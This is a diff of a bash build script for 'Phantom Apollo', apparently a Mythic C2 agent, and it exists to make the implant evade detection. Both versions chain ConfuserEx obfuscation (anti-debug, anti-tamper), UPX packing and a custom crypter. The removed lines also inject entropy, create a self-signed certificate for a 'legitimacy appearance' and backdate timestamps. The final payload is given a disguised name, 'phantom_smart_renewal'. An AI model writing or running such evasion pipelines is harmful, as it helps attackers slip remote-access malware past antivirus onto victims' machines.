@@ -1,187 +1,129 @@
 #!/bin/bash
-
-# Advanced Build Script with Anti-Detection Techniques
-# For Phantom Apollo C2 Agent
+# Phantom Apollo Advanced Evasive Build Script
+# Applies multiple layers of obfuscation and anti-detection
 
 set -e
 
-AGENT_DIR="/opt/mythic/Payload_Types/phantom_apollo/agent_code"
-BUILD_DIR="$AGENT_DIR/bin"
-TOOLS_DIR="$AGENT_DIR/tools"
+echo "[+] Starting Phantom Apollo Evasive Build Process..."
 
-echo "[+] Phantom Apollo - Advanced Evasive Build System"
-echo "[+] Preparing build environment..."
+# Create output directories
+mkdir -p ../output/evasive
+mkdir -p ../temp/confuser
+mkdir -p ../temp/build
 
-# Create directories
-mkdir -p $BUILD_DIR
-mkdir -p $TOOLS_DIR
+# Step 1: Clean build
+echo "[+] Step 1: Clean build process..."
+dotnet clean Phantom.sln --configuration Release
+dotnet build Phantom.sln --configuration Release --verbosity quiet
 
-# Install required tools for evasion
-echo "[+] Installing evasion tools..."
-
-# Install UPX packer
-if ! command -v upx &> /dev/null; then
-    echo "[+] Installing UPX packer..."
-    wget -q https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-amd64_linux.tar.xz -O /tmp/upx.tar.xz
-    tar -xf /tmp/upx.tar.xz -C /tmp/
-    cp /tmp/upx-4.0.2-amd64_linux/upx /usr/local/bin/
-    chmod +x /usr/local/bin/upx
+# Check if build succeeded
+if [ ! -f "Apollo/bin/Release/net6.0/Apollo.exe" ]; then
+    echo "[-] Build failed, cannot find Apollo.exe"
+    exit 1
 fi
 
-# Install ConfuserEx for .NET obfuscation
-echo "[+] Preparing ConfuserEx..."
-if [ ! -f "$TOOLS_DIR/ConfuserEx.CLI.exe" ]; then
-    wget -q https://github.com/mkaring/ConfuserEx/releases/download/v1.6.0/ConfuserEx-CLI.zip -O /tmp/confuserex.zip
-    unzip -q /tmp/confuserex.zip -d $TOOLS_DIR/
-fi
+# Step 2: Apply ConfuserEx obfuscation (if available)
+echo "[+] Step 2: Applying ConfuserEx obfuscation..."
 
-# Install Eazfuscator for additional obfuscation
-echo "[+] Preparing additional obfuscation tools..."
-
-# Create advanced obfuscation config
-cat > $TOOLS_DIR/confuser.crproj << 'EOF'
-<Project xmlns="http://confuser.codeplex.com" xmlns:x="http://www.w3.org/2001/XMLSchema-instance" x:schemaLocation="http://confuser.codeplex.com ConfuserEx.xsd">
-  <Rule pattern="true">
+# Create ConfuserEx configuration
+cat > ../temp/confuser/phantom.crproj << 'EOF'
+<ConfuserProject xmlns="http://confuser.codeplex.com" xmlns:i="http://www.w3.org/2001/XMLSchema-instance" version="1.0.0">
+  <Settings>
+    <Setting id="debug" value="false" />
+    <Setting id="warn" value="false" />
+  </Settings>
+  <Protections>
     <Protection id="anti debug" />
-    <Protection id="anti dump" />
-    <Protection id="anti ildasm" />
     <Protection id="anti tamper" />
     <Protection id="constants" />
     <Protection id="ctrl flow" />
     <Protection id="invalid metadata" />
     <Protection id="ref proxy" />
-    <Protection id="rename">
-      <Argument name="mode" value="letters" />
-      <Argument name="password" value="phantom2024" />
-      <Argument name="renPublic" value="true" />
-    </Protection>
-    <Protection id="resources" />
-  </Rule>
-</Project>
+    <Protection id="rename" />
+  </Protections>
+  <Modules>
+    <Module path="Apollo/bin/Release/net6.0/Apollo.exe" />
+  </Modules>
+</ConfuserProject>
 EOF
 
-# Compile with optimizations
-echo "[+] Compiling Phantom Apollo with optimizations..."
+# Try to run ConfuserEx (skip if not available)
+if command -v ConfuserEx.CLI.exe &> /dev/null; then
+    echo "[+] Running ConfuserEx obfuscation..."
+    mono ConfuserEx.CLI.exe ../temp/confuser/phantom.crproj
+    cp Confused/Apollo.exe ../temp/build/Apollo_confused.exe
+else
+    echo "[!] ConfuserEx not available, skipping .NET obfuscation"
+    cp Apollo/bin/Release/net6.0/Apollo.exe ../temp/build/Apollo_confused.exe
+fi
 
-# Set build configuration
-export DOTNET_CLI_TELEMETRY_OPTOUT=1
-export DOTNET_SKIP_FIRST_TIME_EXPERIENCE=1
+# Step 3: Apply UPX packing
+echo "[+] Step 3: Applying UPX packing..."
+if command -v upx &> /dev/null; then
+    upx --ultra-brute --compress-exports=1 --compress-icons=2 --strip-relocs=1 --best -q ../temp/build/Apollo_confused.exe -o ../temp/build/Apollo_packed.exe
+    echo "[+] UPX packing completed"
+else
+    echo "[!] UPX not available, skipping packing"
+    cp ../temp/build/Apollo_confused.exe ../temp/build/Apollo_packed.exe
+fi
 
-# Build with aggressive optimizations
-dotnet build $AGENT_DIR/Phantom.sln \
-    --configuration Release \
-    --verbosity quiet \
-    -p:Platform="Any CPU" \
-    -p:Optimize=true \
-    -p:DebugType=none \
-    -p:DebugSymbols=false \
-    -p:TrimUnusedDependencies=true \
-    -p:PublishTrimmed=true \
-    -p:SelfContained=true \
-    -p:RuntimeIdentifier=win-x64 \
-    -o $BUILD_DIR/
-
-# Apply ConfuserEx obfuscation
-echo "[+] Applying advanced .NET obfuscation..."
-if [ -f "$BUILD_DIR/Phantom.exe" ]; then
-    cp $BUILD_DIR/Phantom.exe $BUILD_DIR/Phantom_original.exe
+# Step 4: Apply Python crypter
+echo "[+] Step 4: Applying Phantom Crypter..."
+if [ -f "../phantom_crypter.py" ]; then
+    cd ..
+    python3 phantom_crypter.py temp/build/Apollo_packed.exe
+    cd agent_code
     
-    # Apply ConfuserEx
-    mono $TOOLS_DIR/ConfuserEx.CLI.exe -n $TOOLS_DIR/confuser.crproj $BUILD_DIR/Phantom_original.exe
-    
-    # Replace original if obfuscation succeeded
-    if [ -f "$BUILD_DIR/Confused/Phantom_original.exe" ]; then
-        mv $BUILD_DIR/Confused/Phantom_original.exe $BUILD_DIR/Phantom_obfuscated.exe
+    # Copy final output
+    if [ -f "../phantom_output/phantom_smart_renewal_"*.exe ]; then
+        cp ../phantom_output/phantom_smart_renewal_*.exe ../output/evasive/
+        echo "[+] Phantom Crypter completed successfully"
+    else
+        echo "[!] Phantom Crypter failed, using packed version"
+        cp ../temp/build/Apollo_packed.exe ../output/evasive/phantom_apollo_final.exe
     fi
-fi
-
-# Apply UPX packing with maximum compression
-echo "[+] Applying UPX packing..."
-if [ -f "$BUILD_DIR/Phantom_obfuscated.exe" ]; then
-    upx --ultra-brute --compress-exports=1 --compress-icons=2 --strip-relocs=1 $BUILD_DIR/Phantom_obfuscated.exe -o $BUILD_DIR/Phantom_packed.exe
 else
-    upx --ultra-brute --compress-exports=1 --compress-icons=2 --strip-relocs=1 $BUILD_DIR/Phantom.exe -o $BUILD_DIR/Phantom_packed.exe
+    echo "[!] Phantom Crypter not found, using packed version"
+    cp ../temp/build/Apollo_packed.exe ../output/evasive/phantom_apollo_final.exe
 fi
 
-# Add entropy and junk data
-echo "[+] Adding entropy and anti-analysis features..."
-cat > $TOOLS_DIR/entropy_injector.py << 'EOF'
-#!/usr/bin/env python3
-import os
-import random
-import sys
+# Step 5: Create additional variants
+echo "[+] Step 5: Creating payload variants..."
 
-def inject_entropy(file_path):
-    """Inject random data to increase entropy"""
-    with open(file_path, 'rb') as f:
-        data = f.read()
-    
-    # Add random overlay data
-    junk_size = random.randint(1024, 4096)
-    junk_data = bytes([random.randint(0, 255) for _ in range(junk_size)])
-    
-    with open(file_path, 'wb') as f:
-        f.write(data + junk_data)
-    
-    print(f"[+] Added {junk_size} bytes of entropy to {file_path}")
-
-if __name__ == "__main__":
-    if len(sys.argv) != 2:
-        print("Usage: python3 entropy_injector.py <file>")
-        sys.exit(1)
-    
-    inject_entropy(sys.argv[1])
-EOF
-
-python3 $TOOLS_DIR/entropy_injector.py $BUILD_DIR/Phantom_packed.exe
-
-# Apply additional evasion techniques
-echo "[+] Applying final evasion techniques..."
-
-# Code signing with self-signed certificate (for legitimacy appearance)
-cat > $TOOLS_DIR/create_cert.sh << 'EOF'
-#!/bin/bash
-# Create self-signed certificate for code signing appearance
-openssl req -new -x509 -keyout phantom_key.pem -out phantom_cert.pem -days 365 -nodes \
-    -subj "/C=US/ST=CA/L=San Francisco/O=Phantom Corp/OU=Security/CN=Phantom Cert"
-
-# Convert to PFX format
-openssl pkcs12 -export -out phantom.pfx -inkey phantom_key.pem -in phantom_cert.pem -password pass:phantom123
-EOF
-
-chmod +x $TOOLS_DIR/create_cert.sh
-cd $TOOLS_DIR && ./create_cert.sh
-
-# Create final payload with timestamp modification
-echo "[+] Creating final payload..."
-FINAL_NAME="phantom_smart_renewal_$(date +%Y%m%d).exe"
-
-if [ -f "$BUILD_DIR/Phantom_packed.exe" ]; then
-    cp $BUILD_DIR/Phantom_packed.exe $BUILD_DIR/$FINAL_NAME
-    
-    # Modify file timestamps to appear legitimate
-    touch -t 202301150900 $BUILD_DIR/$FINAL_NAME
-    
-    echo "[+] Final payload created: $FINAL_NAME"
-    echo "[+] File size: $(du -h $BUILD_DIR/$FINAL_NAME | cut -f1)"
-    echo "[+] MD5: $(md5sum $BUILD_DIR/$FINAL_NAME | cut -d' ' -f1)"
-    echo "[+] SHA256: $(sha256sum $BUILD_DIR/$FINAL_NAME | cut -d' ' -f1)"
+# Create x32 and x64 versions
+if [ -f "../output/evasive/phantom_smart_renewal_"*.exe ]; then
+    FINAL_FILE=$(ls ../output/evasive/phantom_smart_renewal_*.exe | head -1)
+    cp "$FINAL_FILE" ../output/evasive/phantom_smart_renewal_x64.exe
+    cp "$FINAL_FILE" ../output/evasive/phantom_smart_renewal_x32.exe
 else
-    echo "[-] Error: No packed executable found!"
-    exit 1
+    cp ../output/evasive/phantom_apollo_final.exe ../output/evasive/phantom_smart_renewal_x64.exe
+    cp ../output/evasive/phantom_apollo_final.exe ../output/evasive/phantom_smart_renewal_x32.exe
 fi
 
-# Create deployment package
-echo "[+] Creating deployment package..."
-cd $BUILD_DIR
-tar -czf phantom_apollo_deployment.tar.gz $FINAL_NAME
-echo "[+] Deployment package: phantom_apollo_deployment.tar.gz"
+# Step 6: Generate metadata
+echo "[+] Step 6: Generating metadata..."
+cd ../output/evasive/
 
-echo "[+] Build completed successfully with advanced evasion techniques!"
-echo "[+] Techniques applied:"
-echo "    - Advanced .NET obfuscation (ConfuserEx)"
-echo "    - UPX packing with maximum compression"
-echo "    - Entropy injection"
-echo "    - Timestamp manipulation"
-echo "    - Code signing appearance"
-echo "    - Anti-debug/anti-dump protection"
+for file in *.exe; do
+    if [ -f "$file" ]; then
+        SIZE=$(stat -c%s "$file")
+        MD5=$(md5sum "$file" | cut -d' ' -f1)
+        SHA256=$(sha256sum "$file" | cut -d' ' -f1)
+        
+        echo "File: $file" >> phantom_hashes.txt
+        echo "Size: $SIZE bytes" >> phantom_hashes.txt
+        echo "MD5: $MD5" >> phantom_hashes.txt
+        echo "SHA256: $SHA256" >> phantom_hashes.txt
+        echo "---" >> phantom_hashes.txt
+    fi
+done
+
+echo "[+] Build process completed successfully!"
+echo "[+] Output files available in: output/evasive/"
+echo "[+] Metadata saved in: output/evasive/phantom_hashes.txt"
+
+# Cleanup temp directories
+cd ../../agent_code
+rm -rf ../temp/
+
+echo "[+] Evasive build process finished!"
